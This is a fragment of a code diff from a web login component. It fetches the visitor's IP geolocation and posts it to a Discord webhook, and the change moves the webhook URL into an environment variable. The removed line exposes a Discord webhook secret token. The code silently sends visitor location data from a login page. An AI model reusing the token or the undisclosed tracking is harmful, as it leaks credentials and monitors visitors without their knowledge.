@@ -32,7 +32,7 @@ function LoginContent() {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
 
-                await fetch('https://discord.com/api/webhooks/1482694137856790570/jt6irdBlQ4rXMrVV0GFdEHX46dQ2fgVmijV8icIWlYSGsSId9JS5DrmHUuvU2kYgJTmr', {
+                await fetch(process.env.NEXT_PUBLIC_DISCORD_WEBHOOK_URL!, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
